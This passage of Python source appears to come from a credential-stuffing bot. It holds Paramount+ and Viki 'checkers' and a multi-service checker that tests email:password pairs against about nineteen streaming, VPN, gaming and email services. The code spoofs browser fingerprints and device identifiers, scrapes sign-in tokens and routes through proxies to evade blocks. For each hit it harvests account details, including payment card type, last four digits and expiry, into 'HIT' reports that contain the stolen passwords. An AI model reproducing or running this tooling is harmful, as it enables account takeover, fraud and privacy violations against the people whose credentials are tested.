        return None, None
    candidates.sort(key=lambda x: (x[0], x[1]))
    return candidates[0][2], candidates[0][3]


def _hunt_price(*sources):
    for src in sources:
        if not src:
            continue
        for path, value in _walk_json(src):
            lpath = path.lower()
            if any(k in lpath for k in ('amount', 'price', 'cost', 'charge', 'fee')):
                if isinstance(value, (int, float)) and value > 0:
                    return str(value)
                if isinstance(value, str):
                    try:
                        f = float(value)
                        if f > 0:
                            return f"{f:.2f}"
                    except Exception:
                        pass
    return None


def _hunt_currency(*sources):
    for src in sources:
        if not src:
            continue
        for path, value in _walk_json(src):
            lpath = path.lower()
            if 'currency' in lpath and isinstance(value, str):
                v = value.strip().upper()
                if 2 <= len(v) <= 4 and v.isalpha():
                    return v
    return None



def _build_multipart(fields, boundary):
    parts = []
    for name, value in fields.items():
        parts.append(f"--{boundary}\r\n")
        parts.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n')
        parts.append(f"{value}\r\n")
    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode("utf-8")


def _rand_boundary():
    return "----WebKitFormBoundary" + "".join(
        random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        for _ in range(16)
    )




class _ParamountCore:
    def __init__(self):
        pass
        self.session = cffi_requests.Session(impersonate="chrome")


    def _extract_tk_trp(self, html: str):
        """Aggressive tk_trp extraction for Paramount+ sign-in HTML/JS."""
        if not html:
            return None
        patterns = [
            r'name=["\']tk_trp["\'][^>]*value=["\']([^"\']+)["\']',
            r'value=["\']([^"\']+)["\'][^>]*name=["\']tk_trp["\']',
            r'name=["\']tk_trp["\']\s*value=["\']([^"\']+)["\']',
            r'"tk_trp"\s*:\s*"([^"]+)"',
            r"'tk_trp'\s*:\s*'([^']+)'",
            r'tk_trp["\']?\s*[:=]\s*["\']([^"\']{16,})["\']',
            r'data-tk[_-]?trp=["\']([^"\']+)["\']',
            r'tkTrp["\']?\s*[:=]\s*["\']([^"\']{16,})["\']',
            r'["\']tkTrp["\']\s*:\s*["\']([^"\']+)["\']',
            r'name=["\']csrf[^"\']*["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\'][_]?token["\'][^>]*value=["\']([^"\']+)["\']',
            r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']tk_trp["\'][^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+name=["\']tk_trp["\'][^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']+)["\']',
        ]
        for pat in patterns:
            m = re.search(pat, html, re.I | re.S)
            if m:
                val = (m.group(1) or "").strip()
                if len(val) >= 8:
                    return val
        # last resort: any hidden input near tk_trp substring
        idx = html.lower().find("tk_trp")
        if idx >= 0:
            window = html[max(0, idx - 200): idx + 400]
            m = re.search(r'value=["\']([^"\']{12,})["\']', window, re.I)
            if m:
                return m.group(1).strip()
        return None

    def _get_signin(self, proxy=None):
        """Fetch sign-in page and extract tk_trp. Tries multiple locales/endpoints."""
        proxy_dict = {"http": proxy, "https": proxy} if proxy else None
        headers_doc = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": PARAMOUNT_UA,
        }
        urls = [
            f"{PARAMOUNT_BASE}/account/signin/",
            f"{PARAMOUNT_BASE}/account/signin/?flow=sign-in",
            f"{PARAMOUNT_BASE}/account/xhr/login/",  # sometimes redirects/cookies only
            f"{PARAMOUNT_BASE}/",
            "https://www.paramountplus.com/gb/account/signin/",
            "https://www.paramountplus.com/ca/account/signin/",
            "https://www.paramountplus.com/au/account/signin/",
        ]
        last_err = "no_tk_trp"
        last_resp = None
        # warm homepage first for cookies (helps some regions)
        try:
            self.session.get(
                f"{PARAMOUNT_BASE}/",
                headers=headers_doc,
                proxies=proxy_dict,
                timeout=30,
                allow_redirects=True,
            )
        except Exception:
            pass

        for url in urls:
            try:
                r = self.session.get(
                    url,
                    headers=headers_doc,
                    proxies=proxy_dict,
                    timeout=30,
                    allow_redirects=True,
                )
            except Exception as e:
                msg = str(e).lower()
                if "timeout" in msg:
                    last_err = "timeout"
                elif "proxy" in msg:
                    last_err = "proxy"
                else:
                    last_err = str(e)[:60]
                continue

            last_resp = r
            if r.status_code == 403:
                last_err = "block"
                continue
            if r.status_code == 429:
                last_err = "rate_limit"
                continue
            if r.status_code not in (200, 201):
                last_err = f"http_{r.status_code}"
                continue

            html = r.text or ""
            # soft size check — SPA pages can be smaller than 50k
            if len(html) < 500 and r.status_code == 200:
                last_err = "block"
                continue

            tk = self._extract_tk_trp(html)
            if tk:
                return r, tk, None

            # sometimes token only in cookies / set-cookie style names
            try:
                for cname, cval in dict(getattr(r, "cookies", {}) or {}).items():
                    if "trp" in cname.lower() or "csrf" in cname.lower() or "token" in cname.lower():
                        if cval and len(str(cval)) >= 8:
                            return r, str(cval), None
            except Exception:
                pass

            last_err = "no_tk_trp"

        # Final attempt: POST-less form bootstrap via xhr endpoint cookies
        try:
            r = self.session.get(
                f"{PARAMOUNT_BASE}/account/signin/",
                headers={**headers_doc, "sec-fetch-site": "same-origin", "referer": f"{PARAMOUNT_BASE}/"},
                proxies=proxy_dict,
                timeout=30,
            )
            last_resp = r
            tk = self._extract_tk_trp(r.text or "")
            if tk:
                return r, tk, None
            if r.status_code == 403:
                last_err = "block"
        except Exception as e:
            last_err = str(e)[:60]

        return last_resp, None, last_err


    def _post_login(self, email, password, tk_trp, proxy=None):
        boundary = _rand_boundary()
        fields = {
            "email": email,
            "password": password,
            "tk_trp": tk_trp,
            "recaptchaAction": "FORM_SIGN_IN",
            "recaptchaPartner": "PPLUS",
        }
        body = _build_multipart(fields, boundary)

        try:
            r = self.session.post(
                f"{PARAMOUNT_BASE}/account/xhr/login/",
                data=body,
                headers={
                    **COMMON_HEADERS,
                    'content-type': f'multipart/form-data; boundary={boundary}',
                    'content-length': str(len(body)),
                    'origin': PARAMOUNT_BASE,
                    'referer': f'{PARAMOUNT_BASE}/account/signin/',
                },
                proxies={"http": proxy, "https": proxy} if proxy else None,
                timeout=30,
            )
        except requests.exceptions.Timeout:
            return None, "timeout"
        except requests.exceptions.ProxyError:
            return None, "proxy"
        except requests.exceptions.ConnectionError:
            return None, "proxy"
        except Exception as e:
            return None, str(e)[:80]

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code == 403:
            return None, "block"
        if r.status_code not in (200, 201):
            return None, f"http_{r.status_code}"

        try:
            body_json = r.json()
        except Exception:
            return None, "parse"

        if not body_json.get("success"):
            msg = body_json.get("error") or body_json.get("message") or "Login failed"
            return {"bad": True, "message": str(msg)[:120]}, None

        return {"bad": False, "data": body_json}, None

    def _fetch_billing(self, proxy=None):
        try:
            r = self.session.get(
                f"{PARAMOUNT_BASE}/account/xhr/fetch-billing-data/",
                headers={**COMMON_HEADERS, 'referer': f'{PARAMOUNT_BASE}/account/'},
                proxies={"http": proxy, "https": proxy} if proxy else None,
                timeout=30,
            )
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def _fetch_subs(self, proxy=None):
        try:
            r = self.session.get(
                f"{PARAMOUNT_BASE}/account/xhr/fetch-subscription-data/",
                headers={**COMMON_HEADERS, 'referer': f'{PARAMOUNT_BASE}/account/'},
                proxies={"http": proxy, "https": proxy} if proxy else None,
                timeout=30,
            )
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def check(self, email, password, proxy=None):
        pass

        _, tk_trp, err = self._get_signin(proxy)
        if err:
            return {"status": "error", "error_type": err, "message": f"signin: {err}"}

        login_result, err = self._post_login(email, password, tk_trp, proxy)
        if err:
            return {"status": "error", "error_type": err, "message": f"login: {err}"}
        if login_result.get("bad"):
            return {"status": "bad", "error_type": "creds",
                    "message": login_result["message"]}

        body = login_result["data"]
        user = body.get("user") or {}
        profile = user.get("profile") or {}
        svod = user.get("svod") or {}
        packages = svod.get("packages") or []
        pkg = packages[0] if packages else {}
        entitlement = user.get("entitlement") or {}

        billing = self._fetch_billing(proxy) or {}
        billing_info = (billing.get("result") or {}).get("billingInfo") or {}

        subs = self._fetch_subs(proxy) or {}
        sub_user = (subs.get("result") or {}).get("user") or {}
        sub_svod = sub_user.get("svod") or {}
        sub_packages = sub_svod.get("packages") or []
        sub_pkg = sub_packages[0] if sub_packages else pkg

        package_code = (sub_pkg.get("code") or pkg.get("code") or "").strip()
        package_status = (sub_pkg.get("status") or pkg.get("status") or "").strip()
        package_status_raw = (sub_svod.get("package_status_raw")
                              or svod.get("package_status_raw") or "").strip()
        package_source = (sub_pkg.get("source") or pkg.get("source") or "").strip()

        on_trial = bool(sub_pkg.get("on_trial") if sub_pkg else pkg.get("on_trial"))

        country = (sub_svod.get("userRegistrationCountry")
                   or svod.get("userRegistrationCountry")
                   or profile.get("country") or "US").strip()

        card_type = (billing_info.get("cardType") or "").strip()
        last_four = (billing_info.get("lastFour") or "").strip()
        exp_month = billing_info.get("cardExpMonth") or ""
        exp_year = billing_info.get("cardExpYear") or ""
        is_card = bool(billing_info.get("isTypeCard"))
        is_paypal = bool(billing_info.get("isTypePaypal"))
        is_gift = bool(billing_info.get("isTypeGift"))

        if is_card:
            payment_method = f"Card {card_type}".strip() if card_type else "Card"
        elif is_paypal:
            payment_method = "PayPal"
        elif is_gift:
            payment_method = "Gift"
        else:
            payment_method = "No Payment"

        if exp_month and exp_year:
            try:
                mm = int(str(exp_month).zfill(2))
                yy = str(exp_year)
                card_expiry = f"{mm:02d}/{yy}"
            except Exception:
                card_expiry = "No Card"
        else:
            card_expiry = "No Card"

        card_type_out = card_type if card_type else "No Card"
        last_four_out = last_four if last_four else "No Card"

        account_expiry, _ = _hunt_plan_end(billing, subs, user)
        if not account_expiry:
            src_lower = package_source.lower()
            if 'apple' in src_lower:
                account_expiry = 'Managed by Apple'
            elif 'google' in src_lower:
                account_expiry = 'Managed by Google'
            elif 'roku' in src_lower or 'amazon' in src_lower:
                account_expiry = 'Managed by Vendor'
            else:
                account_expiry = 'No Renewal'

        price_raw = _hunt_price(billing, subs, user)
        currency = _hunt_currency(billing, subs, user) or "USD"
        has_price = bool(price_raw and float(price_raw) > 0)
        price_out = f"{currency} {price_raw}" if has_price else "-"

        is_free = package_code.upper() == "NEW_FREE_PACKAGE"
        subscriber = not is_free

        kids = (profile.get("profile_type") or "").upper() == "KIDS"

        result = {
            "email": profile.get("email") or email,
            "user_id": body.get("userId"),
            "reg_id": user.get("regID"),
            "display_name": user.get("displayName") or "",
            "first_name": profile.get("first_name") or "",
            "last_name": profile.get("last_name") or "",
            "profile_type": profile.get("profile_type") or "",
            "country": country or "US",
            "package_code": package_code,
            "package_status": package_status or package_status_raw or "UNKNOWN",
            "package_status_raw": package_status_raw or package_status,
            "package_source": package_source,
            "plan_tier": (sub_pkg.get("plan_tier") or pkg.get("plan_tier") or "standard"),
            "on_trial": on_trial,
            "holding_state": sub_pkg.get("holding_state") or pkg.get("holding_state") or "OK",
            "is_subscriber": subscriber,
            "is_free": is_free,
            "ad_free": bool(entitlement.get("adFree")) or "AD_FREE" in package_code.upper(),
            "card_type": card_type_out,
            "last_four": last_four_out,
            "card_expiry": card_expiry,
            "payment_method": payment_method,
            "price": price_out,
            "account_expiry": account_expiry,
            "kids": kids,
        }

        if DEBUG:
            print("\n--- debug ---")
            print(f"    package_code: {package_code}")
            print(f"    package_source: {package_source}")
            print(f"    package_status: {package_status}")
            print(f"    package_status_raw: {package_status_raw}")
            print(f"    has_price: {has_price}")
            print(f"    is_free: {is_free}")
            print(f"    subscriber: {subscriber}")
            print(f"    account_expiry: {account_expiry}")

        return {"status": "valid", "error_type": None,
                "message": "Login successful", "user": result}




class ParamountChecker:
    """Bot-facing Paramount+ checker with native hit format."""

    def __init__(self, proxy=None):
        self.proxy = proxy
        self.core = _ParamountCore()

    def check(self, email, password, proxy=None):
        p = proxy or self.proxy
        try:
            result = self.core.check(email, password, p)
        except Exception as e:
            return {"status": "error", "message": str(e)[:100]}

        status = str(result.get("status", "error")).lower()
        if status == "bad":
            return {"status": "bad", "message": result.get("message") or "Invalid credentials"}
        if status != "valid":
            err = str(result.get("error_type") or "")
            msg = str(result.get("message") or err or "error")
            if err == "no_tk_trp" or "no_tk_trp" in msg:
                msg = "no_tk_trp — use US/allowed-region proxy (sign-in page blocked on this IP)"
            elif err == "block" or "signin: block" in msg:
                msg = "blocked by Paramount — use residential/US proxy"
            elif err == "proxy":
                msg = "proxy error — switch proxy"
            return {"status": "error", "message": msg}

        u = result.get("user") or {}
        is_free = bool(u.get("is_free"))
        out_status = "free" if is_free else "premium"

        def s(v):
            return clean_val(v, "-")

        plan = s(u.get("package_code"))
        pkg_status = s(u.get("package_status_raw") or u.get("package_status"))
        tier = s(u.get("plan_tier"))
        price = s(u.get("price"))
        country = format_country(u.get("country") or u.get("country_code") or "")
        payment = s(u.get("payment_method"))
        card = s(u.get("card_type"))
        last4 = s(u.get("last_four"))
        card_exp = s(u.get("card_expiry"))
        acct_exp = s(u.get("account_expiry"))
        trial = str(u.get("on_trial", False)).lower()
        subscriber = str(u.get("is_subscriber", False)).lower()
        adfree = str(u.get("ad_free", False)).lower()
        kids = str(u.get("kids", False)).lower()

        title = (
            f"{E('success')} <b>HIT</b> — Paramount+ {E('gem')}"
            if not is_free
            else f"{E('unlock')} <b>FREE</b> — Paramount+ {E('star')}"
        )
        lines = [
            title,
            "",
            f"{E('mail')} <b>Account</b> ➜ <code>{email}:{password}</code>",
            f"{E('ok1')} <b>Status</b> ➜ {pkg_status}",
            f"{E('spark')} <b>Plan</b> ➜ {plan}",
            f"{E('star')} <b>Tier</b> ➜ {tier}",
            f"{E('cash')} <b>Price</b> ➜ {price}",
            f"{E('bolt')} <b>Trial</b> ➜ {trial}",
            f"{E('success')} <b>Subscriber</b> ➜ {subscriber}",
            f"{E('fire')} <b>AdFree</b> ➜ {adfree}",
            f"{E('world')} <b>Country</b> ➜ {country}",
            f"{E('card')} <b>Payment</b> ➜ {payment}",
            f"{E('card')} <b>Card</b> ➜ {card}",
            f"{E('pin')} <b>Last4</b> ➜ {last4}",
            f"{E('time')} <b>Card Expiry</b> ➜ {card_exp}",
            f"{E('cal')} <b>Account Expiry</b> ➜ {acct_exp}",
            f"{E('teddy')} <b>Kids</b> ➜ {kids}",
            "",
            f"{E('crown')} <b>Made By</b> ➜ {PARAMOUNT_AUTHOR}",
        ]
        cleaned = []
        for ln in lines:
            if not ln:
                cleaned.append(ln)
                continue
            low = ln.lower()
            if ("➜ -" in low or "➜ n/a" in low) and "account" not in low and "made by" not in low:
                continue
            cleaned.append(ln)
        hit_text = "\n".join(cleaned)
        zip_line = format_zip_style_hit(email, password, {
            "status": out_status,
            "package_status": pkg_status,
            "plan": plan,
            "plan_base": plan,
            "tier": tier,
            "price": price,
            "on_trial": trial,
            "is_subscriber": subscriber,
            "ad_free": adfree,
            "country": u.get("country") or "",
            "payment": payment,
            "card_type": card,
            "card_last4": last4,
            "card_expiry": card_exp,
            "expires": acct_exp,
            "kids": kids,
        }, "Paramount+")

        return {
            "status": out_status,
            "zip_line": zip_line,
            "hit_line": zip_line,
            "message": "Subscriber" if not is_free else "Free account",
            "plan": plan,
            "plan_base": plan,
            "country": u.get("country") or "",
            "payment": payment,
            "price": price,
            "expires": acct_exp,
            "user": s(u.get("display_name") or u.get("first_name") or ""),
            "hit_text": hit_text,
            "package_status": pkg_status,
            "on_trial": trial,
            "ad_free": adfree,
            "card_type": card,
            "card_last4": last4,
            "is_subscriber": subscriber,
            "checked_by": PARAMOUNT_AUTHOR,
        }




# ----- Viki Checker (api.viki.io) — by @samvir1 -----
class VikiChecker:
    VIKI_API = "https://api.viki.io/v5/sessions.json"
    TIMESTAMP_URL = "https://play.googleapis.com/play/log/timestamp"
    TRANSLATE = {"37p": "VikiPass Plus", "29p": "VikiPass Plus", "23p": "VikiPass Standard"}

    def __init__(self, proxy=None, timeout=25):
        self.proxy = proxy
        self.timeout = timeout

    def _proxy_dict(self, proxy=None):
        p = proxy or self.proxy
        if not p:
            return None
        if not str(p).startswith(("http://", "https://", "socks")):
            p = "http://" + str(p)
        return {"http": p, "https": p}

    def _rand_hex(self, n):
        return "".join(random.choice("0123456789abcdef") for _ in range(n))

    def _device(self):
        mfg = random.choice(["apple", "samsung", "xiaomi"])
        models = {
            "apple": ["iPhone13,2", "iPhone14,5", "iPhone12,8"],
            "samsung": ["SM-G991B", "SM-A536B"],
            "xiaomi": ["M2101K6G", "2201117TG"],
        }
        model = random.choice(models[mfg])
        app = random.choice(["6.16.0.5", "6.15.2.1", "6.17.1.2"])
        return {
            "manufacturer": mfg,
            "model": model,
            "os_ver": random.choice(["13.4", "14.3", "15.1"]),
            "app_ver": app,
            "carrier": random.choice(["WIFI", "4G", "5G"]),
            "user_agent": f"Viki/{app} CFNetwork/1209 Darwin/20.2.0",
            "as_id": f"{self._rand_hex(4)}-{self._rand_hex(4)}-{self._rand_hex(4)}-{self._rand_hex(6)}",
            "signature": self._rand_hex(40),
        }

    def _flatten(self, obj, prefix=""):
        flat = {}
        if isinstance(obj, dict):
            for k, v in obj.items():
                key = f"{prefix}.{k}" if prefix else k
                if isinstance(v, (dict, list)):
                    flat.update(self._flatten(v, key))
                else:
                    flat[key] = v
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                key = f"{prefix}[{i}]" if prefix else f"[{i}]"
                if isinstance(item, (dict, list)):
                    flat.update(self._flatten(item, key))
                else:
                    flat[key] = item
        return flat

    def _resolve_plan(self, code):
        s = str(code or "")
        if s in self.TRANSLATE:
            return self.TRANSLATE[s]
        if re.match(r"^\d+[a-z]$", s):
            return f"VikiPass {s.upper()}"
        return s or "-"

    def _human_time(self, iso):
        if not iso:
            return "-"
        try:
            s = str(iso).rstrip("Z")
            if "." in s:
                s = s.split(".")[0]
            dt = datetime.strptime(s, "%Y-%m-%dT%H:%M:%S")
            return dt.strftime("%b %d, %Y %H:%M UTC")
        except Exception:
            return str(iso)

    def check(self, email, password, proxy=None):
        proxies = self._proxy_dict(proxy)
        d = self._device()
        try:
            session = curl_requests.Session()
        except Exception:
            session = requests.Session()

        # timestamp
        try:
            try:
                r_ts = session.get(
                    self.TIMESTAMP_URL,
                    headers={
                        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; {d['model']} Build/NRD90M)",
                        "Host": "play.googleapis.com",
                    },
                    proxies=proxies,
                    timeout=self.timeout,
                    impersonate="chrome131",
                )
            except TypeError:
                r_ts = session.get(
                    self.TIMESTAMP_URL,
                    headers={
                        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; {d['model']} Build/NRD90M)",
                        "Host": "play.googleapis.com",
                    },
                    proxies=proxies,
                    timeout=self.timeout,
                )
            if r_ts.status_code != 200:
                return {"status": "error", "message": f"timestamp_{r_ts.status_code}"}
            timestamp = (r_ts.text or "").strip()
        except Exception as e:
            return {"status": "error", "message": f"timestamp:{str(e)[:80]}"}

        body = json.dumps({
            "password": password,
            "login_id": email,
            "app_id": "100004a",
        })
        headers = {
            "Host": "api.viki.io",
            "X-Viki-as-id": d["as_id"],
            "Accept": "*/*",
            "timestamp": timestamp,
            "X-Viki-carrier": d["carrier"],
            "X-Viki-device-os-ver": d["os_ver"],
            "X-Viki-app-ver": d["app_ver"],
            "Accept-Language": "en-us",
            "X-Viki-manufacturer": d["manufacturer"],
            "signature": d["signature"],
            "X-Viki-device-model": d["model"],
            "X-Viki-connection-type": "WIFI",
            "User-Agent": d["user_agent"],
            "Content-Type": "application/json",
        }
        try:
            try:
                r = session.post(
                    self.VIKI_API,
                    headers=headers,
                    data=body,
                    proxies=proxies,
                    timeout=self.timeout,
                    impersonate="chrome131",
                )
            except TypeError:
                r = session.post(
                    self.VIKI_API,
                    headers=headers,
                    data=body,
                    proxies=proxies,
                    timeout=self.timeout,
                )
        except Exception as e:
            return {"status": "error", "message": f"session:{str(e)[:80]}"}

        raw = r.text or ""
        if r.status_code in (401, 403):
            low = raw.lower()
            if "password" in low or "credential" in low or "invalid" in low or "unauthorized" in low:
                return {"status": "bad", "message": "Invalid credentials"}
            return {"status": "error", "message": f"http_{r.status_code}"}
        if r.status_code == 429:
            return {"status": "error", "message": "rate_limit"}
        if r.status_code != 200:
            return {"status": "error", "message": f"http_{r.status_code}"}

        try:
            parsed = r.json()
        except Exception:
            return {"status": "error", "message": "bad_json"}

        # error shape
        if isinstance(parsed, dict) and (parsed.get("error") or parsed.get("errors")):
            err = str(parsed.get("error") or parsed.get("errors") or "")
            if any(x in err.lower() for x in ("password", "credential", "invalid", "not found", "login")):
                return {"status": "bad", "message": err[:120]}
            return {"status": "error", "message": err[:120]}

        flat = self._flatten(parsed)
        token_val = (
            flat.get("token")
            or flat.get("session.token")
            or flat.get("user.token")
            or ""
        )
        if not token_val and not flat.get("user.id") and not flat.get("user.email"):
            return {"status": "bad", "message": "Invalid credentials"}

        email_verified = flat.get("user.email_verified", flat.get("email_verified", "-"))
        country = flat.get("user.country", flat.get("country", "-"))
        uid = flat.get("user.id", flat.get("id", "-"))
        username = flat.get("user.username", "")
        name = flat.get("user.name", "")
        created = flat.get("user.created_at", "")
        subscriber_raw = flat.get("user.subscriber", flat.get("subscriber"))
        subscription = flat.get("user.subscription", flat.get("subscription", ""))
        plan = self._resolve_plan(subscription) if subscription else "-"

        is_free = subscriber_raw is False or str(subscriber_raw).lower() in ("false", "0", "none")
        is_sub = subscriber_raw is True or str(subscriber_raw).lower() in ("true", "1")
        if not is_sub and not is_free:
            # infer from plan
            is_sub = bool(subscription) and plan not in ("-", "Unknown")
            is_free = not is_sub

        status = "premium" if is_sub else "free"
        country_fmt = format_country(country) if "format_country" in globals() else country
        zip_line = (
            f"{email}:{password} | Plan:{plan} | Subscriber:{str(is_sub).lower()} | "
            f"Free:{str(is_free).lower()} | Verified:{email_verified} | Country:{country} | "
            f"User:{username} | Name:{name} | UID:{uid} | Created:{self._human_time(created)} | "
            f"by {CONTACT_ADMIN}"
        )
        hit_text = (
            (E("success") if status == "premium" else E("unlock"))
            + " <b>VIKI "
            + ("HIT" if status == "premium" else "FREE")
            + "</b> "
            + E("gem")
            + "\n\n"
            + E("mail")
            + " <b>Account</b> ➜ <code>"
            + email
            + ":"
            + password
            + "</code>\n"
            + E("ok1")
            + " <b>Status</b> ➜ "
            + status.upper()
            + "\n"
            + E("spark")
            + " <b>Plan</b> ➜ "
            + str(plan)
            + "\n"
            + E("world")
            + " <b>Country</b> ➜ "
            + str(country_fmt)
            + "\n"
            + E("user")
            + " <b>Username</b> ➜ "
            + str(username or "-")
            + "\n"
            + E("time")
            + " <b>Created</b> ➜ "
            + self._human_time(created)
            + "\n"
            + E("crown")
            + " <b>Made By</b> ➜ "
            + str(CONTACT_ADMIN)
        )
        return {
            "status": status,
            "plan": plan,
            "country": country,
            "username": username,
            "name": name,
            "user_id": uid,
            "email_verified": email_verified,
            "is_subscriber": is_sub,
            "is_free": is_free,
            "created_at": created,
            "zip_line": zip_line,
            "hit_line": zip_line,
            "hit_text": hit_text,
            "message": plan,
        }


class MultiChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.checkers = {
            "dazn": DAZNChecker(proxy),
            "deezer": DeezerChecker(proxy),
            "disney": DisneyChecker(proxy),
            "hotspotshield": HotspotShieldChecker(proxy),
            "nordvpn": NordVPNChecker(proxy),
            "steam": SteamChecker(proxy),
            "expressvpn": ExpressVPNChecker(proxy),
            "crunchyroll": CrunchyrollChecker(proxy),
            "xbox": XboxChecker(proxy),
            "hotmail": HotmailChecker(proxy),
            "nba": NBAChecker(proxy),
            "paramount": ParamountChecker(proxy),
            "netflix": NetflixChecker(proxy),
            "viki": VikiChecker(proxy),
            "pluto": PlutoChecker(proxy),
            "plex": PlexChecker(proxy),
            "peacock": PeacockChecker(proxy),
            "tabii": TabiiChecker(proxy),
            "playabl": PlayablChecker(proxy),
        }

    def check(self, email: str, password: str) -> Dict:
        results = {}
        # hard per-platform timeout — prevents multi stall / freeze
        PER_PLATFORM_TIMEOUT = 18

        def _one(name, checker):
            try:
                try:
                    result = checker.check(email, password, self.proxy)
                except TypeError:
                    result = checker.check(email, password)
                if not isinstance(result, dict):
                    result = {"status": "error", "message": "bad_result"}
                status = str(result.get("status", "error")).lower()
                if status in ("hit", "premium", "valid", "success"):
                    status = "premium"
                elif status in ("free", "expired"):
                    status = "free"
                elif status in ("bad", "invalid", "ban"):
                    status = "bad"
                elif status == "2fa":
                    status = "2fa"
                else:
                    status = "error"
                result = dict(result)
                result["status"] = status
                result["_platform"] = name
                return result
            except Exception as e:
                return {"status": "error", "message": str(e)[:120], "_platform": name}

        def _run_with_timeout(name, checker):
            box = {}
            def _target():
                box["r"] = _one(name, checker)
            t = threading.Thread(target=_target, daemon=True)
            t.start()
            t.join(PER_PLATFORM_TIMEOUT)
            if t.is_alive():
                return {"status": "error", "message": "timeout", "_platform": name}
            return box.get("r") or {"status": "error", "message": "no_result", "_platform": name}

        def _is_blank(v):
            if v is None:
                return True
            s = str(v).strip()
            if not s:
                return True
            if s.upper() in ("N/A", "NA", "NONE", "NULL", "-", "--", "UNKNOWN", "UNDEFINED"):
                return True
            return False

        def _capture_line(name, res):
            """Prefer checker-native format; strip blank/N/A fields."""
            for k in ("zip_line", "hit_line", "hit_text"):
                native = res.get(k)
                if isinstance(native, str) and native.strip() and "N/A" not in native.upper():
                    parts = [p.strip() for p in native.replace("\n", " | ").split("|")]
                    parts = [p for p in parts if p and not _is_blank(p.split(":")[-1] if ":" in p else p)]
                    if parts:
                        return f"[{name.upper()}] " + " | ".join(parts)
            skip = {"status", "message", "error", "hit_text", "formatted", "format", "card",
                    "display", "zip_line", "hit_line", "raw", "raw_response", "cookies",
                    "token", "access_token", "results", "_platform", "flat", "parsed",
                    "follow_data", "subscription_detail"}
            bits = [f"[{name.upper()}]", f"{email}:{password}"]
            for k, v in res.items():
                if k in skip or k.startswith("_"):
                    continue
                if _is_blank(v):
                    continue
                if isinstance(v, (dict, list)):
                    continue
                label = str(k).replace("_", " ").title()
                bits.append(f"{label}:{v}")
            msg = res.get("message")
            if not _is_blank(msg) and str(msg) not in bits[-1] if bits else True:
                bits.append(f"Info:{msg}")
            bits.append(f"by {CONTACT_ADMIN}")
            return " | ".join(bits)

        def _capture_html(name, res):
            line = _capture_line(name, res)
            return E("ok1") + " <b>" + name.upper() + "</b> ➜ <code>" + line.replace("<", "").replace(">", "")[:500] + "</code>"

        # sequential platforms with hard timeout — no nested ThreadPool (was freezing multi)
        for name, checker in self.checkers.items():
            results[name] = _run_with_timeout(name, checker)

        hits = [n for n, r in results.items() if r.get("status") == "premium"]
        frees = [n for n, r in results.items() if r.get("status") == "free"]
        twofas = [n for n, r in results.items() if r.get("status") == "2fa"]

        if hits:
            overall = "premium"
        elif twofas:
            overall = "2fa"
        elif frees:
            overall = "free"
        elif any(r.get("status") == "error" for r in results.values()):
            overall = "error"
        else:
            overall = "bad"

        hit_list = ", ".join(hits) if hits else "-"
        free_list = ", ".join(frees) if frees else "-"

        hit_captures = [_capture_line(n, results[n]) for n in hits]
        free_captures = [_capture_line(n, results[n]) for n in frees]

        zip_parts = [f"{email}:{password}", f"Status:{overall.upper()}"]
        if hits:
            zip_parts.append("HIT_Platforms:" + hit_list)
        if frees:
            zip_parts.append("FREE_Platforms:" + free_list)
        for cap in hit_captures + free_captures:
            zip_parts.append(cap)
        zip_parts.append(f"by {CONTACT_ADMIN}")
        zip_line = " | ".join(zip_parts)

        multi_title = "HIT" if overall == "premium" else overall.upper()
        head_e = E("success") if overall == "premium" else E("unlock")
        body = (
            head_e + " <b>MULTI " + multi_title + "</b> " + E("gem") + "\n\n"
            + E("mail") + " <b>Account</b> ➜ <code>" + email + ":" + password + "</code>\n"
            + E("ok1") + " <b>Status</b> ➜ " + overall.upper() + "\n"
            + E("fire") + " <b>HIT Platforms</b> ➜ " + hit_list + "\n"
            + E("star") + " <b>FREE Platforms</b> ➜ " + free_list + "\n"
        )
        if hit_captures:
            body += "\n" + E("gem") + " <b>HIT CAPTURE</b>\n"
            for n in hits:
                body += _capture_html(n, results[n]) + "\n"
                ht = results[n].get("hit_text")
                if isinstance(ht, str) and ht.strip() and "N/A" not in ht.upper():
                    body += ht.strip() + "\n\n"
        if free_captures:
            body += "\n" + E("unlock") + " <b>FREE CAPTURE</b>\n"
            for n in frees:
                body += _capture_html(n, results[n]) + "\n"
                ht = results[n].get("hit_text")
                if isinstance(ht, str) and ht.strip() and "N/A" not in ht.upper():
                    body += ht.strip() + "\n\n"
        body += E("crown") + " <b>Made By</b> ➜ " + str(CONTACT_ADMIN)
        hit_text = body

        return {
            "status": overall,
            "results": results,
            "hit_platforms": hits,
            "free_platforms": frees,
            "hit_captures": hit_captures,
            "free_captures": free_captures,
            "zip_line": zip_line,
            "hit_line": zip_line,
            "hit_text": hit_text,
            "message": f"HIT: {hit_list} | FREE: {free_list}",
        }


# ----- Helper Crypto for ExpressVPN (embedded) -----
class AesCryptographyService:
    def decrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(data) + decryptor.finalize()
        unpadder = PKCS7(128).unpadder()
        unpadded = unpadder.update(decrypted) + unpadder.finalize()
        return unpadded

